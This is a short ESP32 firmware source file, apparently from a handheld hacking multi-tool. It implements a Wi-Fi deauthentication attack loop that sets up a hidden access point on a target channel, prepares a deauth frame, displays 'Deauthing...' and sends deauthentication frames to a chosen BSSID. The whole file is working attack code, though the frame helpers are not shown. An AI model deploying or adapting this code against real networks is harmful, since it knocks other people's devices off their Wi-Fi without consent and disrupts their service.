// PID::WIFI_DEAUTH

#include "esp_wifi.h"
#include "esp_system.h"

wifi_ap_record_t ap_record;

void wifiDeauthLoop() {
	if (isSetup()) {
		WiFi.mode(WIFI_AP);
		WiFi.softAP(ssid, "", channel, 1, 4, false);
		memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
	}

	String lines[] = {
		ssid,
		"Deauthing..."
	};
	centeredPrintRows(lines, 2, MEDIUM_TEXT, true);
	drawSpinner();
	canvas.pushSprite(0, getStatusBarHeight());

	deauthSendFrame(bssid, channel);

	checkExit();
}